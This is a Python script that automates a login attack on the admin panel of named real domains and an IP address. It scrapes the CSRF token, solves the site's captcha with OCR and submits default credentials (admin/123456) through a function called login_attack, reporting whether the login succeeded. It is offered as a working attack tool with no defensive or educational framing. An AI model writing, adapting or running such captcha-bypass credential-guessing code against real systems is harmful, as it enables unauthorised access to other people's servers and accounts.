#
import common
import ddddocr, uuid, datetime, stat, secrets
import requests, json, re, os, time, random
from bs4 import BeautifulSoup

base_captcha = "captcha"

# base_url = "http://www.ximimim.top:1008"
base_url = "http://www.bmavi.top"
# base_url = "https://facai362.top"
route_login = "/admin/common/login.shtml"
route_captcha = "/captcha.shtml"
session_request = requests.Session()
session_request.headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
}

ACCOUNT_FILE_NAME = "account.txt"
# 获取文件最多行数
FILE_NUM_LINES = 10


def get_captcha_photo(url, captcha_uuid_name):  # 请求验证码地址获取验证码图片
    # header = {'Cookie': 'PHPSESSID=0'}
    url = url + route_captcha
    res = session_request.get(url=url, verify=False)
    with open(captcha_uuid_name, 'wb') as f:
        f.write(res.content)
    return captcha_uuid_name


def proto_to_captcha1(url, img_path):  # 获取验证码图片并且识别转为可输入的数字或者字母
    # 获取图片
    zh_model = re.compile(u'[\u4e00-\u9fa5]')  # u4e00 和 u9fa5 是中文的两个端点
    img_name = get_captcha_photo(url, img_path)  # 获取验证码并返回完整路径
    res = common.img_ocr(img_name)
    # 判断字符串是否仅由数字字符或者字母数字组成
    if (res.isdigit() or res.isalnum()) and not zh_model.search(res):
        return res
    else:
        print(res, "404error")
        proto_to_captcha1(url, img_path)
        print("走到这里")


def get_captcha_code():  # 获取到正确验证码
    # 创建目录
    dir_path = common.cur_create_dir()
    # 生成图片名称
    uuid = common.create_uuid_png_name()
    # 获取验证码并识别
    captcha_code = proto_to_captcha1(base_url, dir_path + "/" + uuid)
    # print("captcha_code=", captcha_code)
    return captcha_code


def login_token():
    global session_request
    session_request = requests.Session()
    response = session_request.get(base_url + route_login)
    # 使用 BeautifulSoup 解析 HTML 页面
    soup = BeautifulSoup(response.content, 'html.parser')
    # 获取 __token__ 的值
    token = soup.find('input', {'name': '__token__'}).get('value')
    # print(token)
    return token


def login_attack(username, password, code, token):  # ip.addr == 104.233.197.195 and http
    # 请求参数
    data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)  # 正确的
    # print(data)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        # 'Cookie': 'PHPSESSID=gq0npeainecd9vn5si0vqb08g0'
    }
    #  + secrets.token_hex(13),
    # data = urllib3.urlencode(postData)
    # res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
    res = session_request.post(url=base_url + route_login, data=data, headers=header)
    result = json.loads(res.text)
    return result


def main():
    # url = "http://47.109.19.59:7070/admin/common/login.shtml"
    url = "http://47.109.19.59:7070"
    img = "captcha.png"


def start_task():
    token = login_token()
    captcha_code = get_captcha_code()
    username = "admin"
    password = "123456"
    login_info = login_attack(username, password, captcha_code, token)
    login_resp = common.LoginResponse()
    common.dict_to_obj(login_info, login_resp)
    # print(login_resp)
    if login_resp.code == 1:
        print("登录成功,用户名{},密码{}".format(username, password))
    else:
        pass
        # print(login_info['msg'])
        # if "验证码不正确" in print['msg']:
        #     print("重试1次,本次密码{0},验证码{1}".format(password, captcha_code))


if __name__ == '__main__':
    start = time.time()
    start_task()
    end = time.time()
    print("cost:", end - start, "seconds")
